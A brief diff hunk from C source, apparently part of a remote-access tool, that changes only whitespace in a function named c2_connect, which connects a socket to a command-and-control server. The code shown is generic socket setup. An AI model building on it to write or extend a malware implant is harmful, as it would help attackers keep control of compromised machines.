@@ -37,10 +37,9 @@ SOCKET create_socket() {
 // Function to connect the connect socket to c2 server.
 int c2_connect(SOCKET connect_socket, const char *host, const int port) {
 	struct sockaddr_in hint;
-
 	hint.sin_family = AF_INET;
+	
 	hint.sin_port = htons(port);
-
 	inet_pton(AF_INET, host, &hint.sin_addr);
 
 	// Connect to server hosting c2 service
